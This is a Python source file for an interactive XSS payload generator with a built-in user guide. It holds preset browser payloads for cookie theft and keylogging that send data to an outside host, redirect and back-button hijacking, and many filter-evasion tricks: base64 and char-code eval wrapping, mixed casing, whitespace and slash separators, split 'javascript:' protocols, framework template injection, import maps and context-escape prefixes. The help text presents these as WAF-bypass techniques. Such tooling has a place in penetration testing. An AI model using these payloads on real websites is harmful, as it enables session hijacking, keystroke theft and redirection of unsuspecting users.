# -*- coding: utf-8 -*-
import json, sys, base64, random, re, os

PAYLOADS = {
    "cookie_steal": "fetch('https://google.com/log?c='+document.cookie)",
    "redirect": "window.location='https://google.com'",
    "alert": "alert(1)",
    "keylogger": "let b='',t;document.onkeypress=e=>(b+=e.key,t||=setTimeout(()=>(fetch(`https://google.com/log?key=${encodeURIComponent(b)}&d=${location.hostname}`),b='',t=10),3000))",
    "history": "history.pushState(null,null,location.href);window.onpopstate=()=>location='https://github.com/'"
}

EVENT_MAP = {
    "media": {"img": "onerror", "svg": "onload", "video": "onerror", "default": "onload"},
    "input": {"input": "onfocus", "details": "ontoggle", "default": "onchange"},
    "interaction": {"default": "onmouseover"},
    "modern": {"default": "onpointerenter", "details": "ontoggle", "video": "onplay"},
    "pointer": {"div": "onpointerover", "body": "onpointerdown", "default": "onpointerover"},
    "touch": {"body": "ontouchstart", "div": "ontouchmove", "default": "ontouchstart"},
    "wheel": {"default": "onwheel"},
    "aux": {"default": "onauxclick"}
}

HISTORY_FILE = "xss_history.json"

class XSSGenerator:
    def __init__(self, cfg):
        self.cfg = cfg
        self.payload_key = cfg.get('payload', 'alert(1)')
        self.payload = PAYLOADS.get(self.payload_key, self.payload_key)
        self.tag = str(cfg.get('tag', 'none')).lower().strip()
        self.tricks = cfg.get('tricks', [])
        self.context = str(cfg.get('context', '')).lower()
        self.content = cfg.get('content', '')
        self.chars = {"tab": "%09", "lf": "%0a", "cr": "%0d", "slash": "/"}

    def _get_sep(self):
        if "space_jumble" in self.tricks:
            return random.choice([self.chars["tab"], self.chars["lf"], self.chars["cr"]])
        if "slash_sep" in self.tricks:
            return self.chars["slash"]
        return " "

    def _apply_logic_tricks(self, p):

    # 1. Variable assignment mutation
        if "var_assign" in self.tricks:

            if "(" in p and "=" not in p:
                try:
                    func, rest = p.split("(", 1)
                    p = f"x={func},x({rest}"
                except Exception:
                    p = f"x=()=>{{{p}}},x()"

            else:
                p = f"x=()=>{{{p}}},x()"

        elif "array_method" in self.tricks:

            if p.strip() == "confirm(1)":
                p = "[1].map(confirm)"
    
            elif p.strip() == "prompt(1)":
                p = "[8].find(prompt)"

            elif p.strip() == "alert(1)":
                p = "[1].forEach(alert)"
                
            else:
                p = f"[1].map(()=>{{{p}}})"

        return p

    def _smart_case(self, t):
        protected = ["javascript:", "window.location", "alert", "fetch", "atob", "eval"]
        res = "".join([c.upper() if random.random() > 0.5 else c.lower() for c in t])
        for p in protected:
            res = re.sub(re.escape(p), p, res, flags=re.IGNORECASE)
        return res
        
    def build(self):
        if "proto_var" in self.tricks and self.tag != "a":
            print("\n[!] TIP: 'proto_var' should be used with the <a> tag to work.")
        if "framework" in self.tricks and self.tag in ["img", "svg", "a", "video", "details"]:
            print("\n[!] TIP: 'framework' trick works when the target uses Vue or AngularJS, and is better suited for <div> or 'none' tags.")
            
        processed_payload = self.payload
        current_tricks = list(self.tricks)
        print(f"[applied tricks]: {self.tricks}")
        
        if "framework" in current_tricks:
            processed_payload = "{{constructor.constructor('" + processed_payload + "')()}}"


        processed_payload = self._apply_logic_tricks(processed_payload)

        import_map_header = ""
        if "import_map" in current_tricks:
            import_map_header = f'<script type="importmap">{{"imports": {{"x": "data:text/javascript,{processed_payload}"}}}}</script>'
            processed_payload = "import('x')"

        nested_targets = []
        for t in current_tricks:
            if t.startswith("nested"):
                if ":" in t:
                    targets = [k.strip() for k in t.split(":")[1].split(",")]
                    nested_targets = targets
                    for target in targets:
                        if target.startswith("on") and not any(et == f"event:{target}" for et in current_tricks):
                            current_tricks.append(f"event:{target}")
                else:
                    nested_targets = ["alert", "script", "onerror", "onclick", "location", "onmouseover"]
                break

        if "template" in self.tricks: processed_payload = f"`{processed_payload}`"
        if "case" in self.tricks: processed_payload = self._smart_case(processed_payload)
        
        if "charcode" in self.tricks:
            codes = ",".join([str(ord(c)) for c in processed_payload])
            processed_payload = "eval(String.fromCharCode(" + codes + "))"
        elif "base64" in self.tricks:
            b64_val = base64.b64encode(processed_payload.encode()).decode()
            processed_payload = "eval(atob('" + b64_val + "'))"

        prefix = ""
        if self.context and self.context != "none":
            m = {"div": "</div>", "script": "</script>", "attr": "\">", "js_func": ");//", "js_var_single": "';//"}
            for c in self.context.split(','): prefix += m.get(c.strip(), "</" + c.strip() + ">")

        res = "" 
        sep = self._get_sep()
        if self.tag == "none":
            if "import_map" in current_tricks:
                res = prefix + "<script type=\"module\">import \"x\"</script>"
            else:
                res = prefix + (processed_payload if self.context else "<script>" + processed_payload + "</script>")
        elif self.tag == "script":
            if "import_map" in current_tricks:
                res = prefix + "<script type=\"module\">import \"x\"</script>"
            else:
                res = prefix + "<script>" + processed_payload + "</script>"
        else:
            is_event_set = any(t.startswith(("event:", "attr:")) for t in current_tricks) or "framework" in current_tricks
            if not is_event_set:
                if self.tag == "a": current_tricks.append("attr:href")
                elif self.tag in ["img", "video", "audio", "svg"]: current_tricks.append("event:media")
                elif self.tag in ["input", "textarea", "select", "details"]: current_tricks.append("event:input")
                else: current_tricks.append("event:interaction")

            attrs = []
            for t in current_tricks:
                if t.startswith("event:"):
                    group = t.split(":")[1]
                    target_map = EVENT_MAP.get(group, {"default": group})
                    real_event = target_map.get(self.tag, target_map.get("default"))
                    attrs.append(real_event + sep + '=' + sep + '"' + processed_payload.replace('"', '&quot;') + '"')
                elif t.startswith("attr:"):
                    attr_name = t.split(":")[1]
                    proto = "javascript:"
                    if "proto_var" in current_tricks: proto = "java&#13;&#10;script:"
                    attrs.append(attr_name + '=' + sep + '"' + proto + processed_payload + '"')

            if attrs:
                tag_head = "<" + self.tag + sep + (sep.join(attrs))
                if self.tag == "img" and "src=" not in tag_head: tag_head += f"{sep}src=x"
                close_tag = "" if self.tag in ["img", "input"] else "</" + self.tag + ">"
                res = prefix + tag_head + ">" + self.content + close_tag
            else:
                if "import_map" in current_tricks:
                    res = prefix + "<" + self.tag + "><script type=\"module\">import \"x\"</script></" + self.tag + ">"
                elif "framework" in current_tricks:
                    res = prefix + "<" + self.tag + ">" + processed_payload + "</" + self.tag + ">"
                else:
                    res = prefix + "<" + self.tag + "><script>" + processed_payload + "</script></" + self.tag + ">"

        for target in nested_targets:
            if target in res:
                mid = len(target) // 2
                res = res.replace(target, target[:mid] + target + target[mid:])
        
        return import_map_header + res


def save_history(cfg, result):
    history = []
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r", encoding="utf-8") as f:
                history = json.load(f)
        except:
            pass
    history.append({"input": cfg, "output": result})
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(history[-2000:], f, indent=4, ensure_ascii=False)

def show_history():
    if not os.path.exists(HISTORY_FILE):
        print("[!] No records.")
        return
    try:
        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
            history = json.load(f)
            print("\n=== HISTORY ===")
            for i, entry in enumerate(history):
                inp = entry.get('input', 'Error')
                out = entry.get('output', 'Error')
                print("[" + str(i) + "] " + json.dumps(inp) + "\n    -> " + out)
    except:
        print("[!] Failed to load.")

def print_help():
    help_content = """
============================================================
              XSS Payload Generator User Guide
============================================================
0. This script is an XSS payload generator. Users can forward their requests in json format, with a variety of actions and wAF bypass tricks available.
   It does not have the ability to detect XSS vulnerabilities, and fuzzing or automation is not possible.
   It should not be used for illegal purposes. Now have fun!
1. [Available JSON Keys]
   - tag     : HTML tags that you want to generate(ex: "a", "img", "svg", "none") 
   - payload : Action that you want to perform
   - tricks  : Obfuscation or WAF bypass technique (Must be submitted in array like => "tricks":["case"] )
   - context : Escape the environment of the current insertion point (can be separated by commas)
   - content : Any text to be inside the tag

2. [Tag Options]
   - a, body, div, script, input, iframe, svg, details
   - none 

3. [Payload Presets]
   - alert        : alert(1)
   - cookie_steal : Send cookies using fetch()
   - redirect     : redirect to malicious page
   - keylogger    : key input interception
   - history      : Back-button hijacking by history API

4. [Tricks] When applying the trick, it should be enclosed in array form. ex) {"tag": "details", "tricks": ["var_assign"], "payload": "alert(1)"}
   - encoding     : base64, charcode, hex
   - Obfuscation  : case(upper/lower mixed), nested(like alealertrt), template(templete literal, backtic)
   - event        : event:[type] (media, input, interaction, modern), attr:[name]
   - Parsing Bypass
      space_jumble : bypass WAF regular expression by inserting tab(%09) and string(%0a) instead of blank
      slash_sep    : Use slash(/) instead of spaces as attribute separator

   - [Logic Bypass]:
      var_assign   : execute like=> x=alert,x(1)
      array_method : execute like=> [1].map(confirm)

   - Others:
      proto_var    : Insert control character inside protocol javascript: and it only works with <a> tags, but it really doesn't make difference
      framework    : Works in the form like {{constructor.constructor(...)(}} when your target is using Vue or AngularJS
      import_map   : Load bypassing external scripts using importmap function

5. [Context]
   - div, script, style: Close current existing tags
   - attr         : "> Escape existing html properties
   - js_func      : );// Escape existing JavaScript function
   - js_var_single: ';// Escape existing JavaScript variables

6. [Commands]
   - help, history, history_clear, exit

7. [Examples]
   - Basic: {"tag": "img", "payload": "alert(1)"}
     => <img onerror="alert(1)" src=x>

   - WAF parsing bypass: {"tag": "a", "tricks": ["space_jumble", "slash_sep"], "payload": "alert(1)"}
     => <a%0aonmouseover/="alert(1)">

   - {"tag": "details", "tricks": ["var_assign"], "payload": "confirm(1)"}
     => <details ontoggle="x=confirm,x(1)">

   - {"tag": "a", "tricks": ["proto_var", "case"], "payload": "alert(1)"}
     => <a href="java&#13;&#10;script:AlErT(1)">

   - Import Maps: {"tricks": ["import_map"], "payload": "alert(1)"}
     => <script type="importmap">{"imports": {"x": "data:text/javascript,alert(1)"}}</script><script type="module">import "x"</script>

   - History hijcking: {"tag": "body", "payload": "history"}
     => <body onmouseover="history.pushState(null,null,location.href);window.onpopstate=()=>location='https://github.com'">click here!</body>

8. [Useful event handler list]
    [MEDIA]       : onerror, onload, onplay, onplaying, onvolumechange
    [INPUT/FORM]  : onfocus, onblur, oninput, onchange, onsubmit, oninvalid
    [INTERACTION] : onmouseover, onmouseout, onclick, ondblclick, oncontextmenu, onwheel
    [MODERN/PTR]  : onpointerover, onpointerenter, onpointerdown, onpointermove, onauxclick
    [MOBILE/TOUCH]: ontouchstart, ontouchmove, ontouchend, ontoggle
    [CSS/ANIM]    : onanimationstart, onanimationiteration, ontransitionend
============================================================
"""
    print(help_content)
        
if __name__ == "__main__":
    print("=== XSS Generator ===")
    print("Read 'help' for smooth use.")
    
    while True:
        try:
            line = sys.stdin.readline().strip()
            if not line:
                continue
            
            cmd = line.lower()
            if cmd == 'exit':
                break
            if cmd == 'help':
                print_help()
                continue
            if cmd == 'history': 
                show_history() 
                continue
            if cmd == 'history_clear': 
                if os.path.exists(HISTORY_FILE):
                    os.remove(HISTORY_FILE)
                print("[!] Record cleared.")
                continue
            
            cfg = json.loads(line)
            res = XSSGenerator(cfg).build()
            print(">>>result" + res + "\n")
            save_history(cfg, res)
            
        except json.JSONDecodeError:
            print("[!] Invalid JSON format. Try 'help'")
        except Exception as e:
            print("[!] System Error: " + str(e))
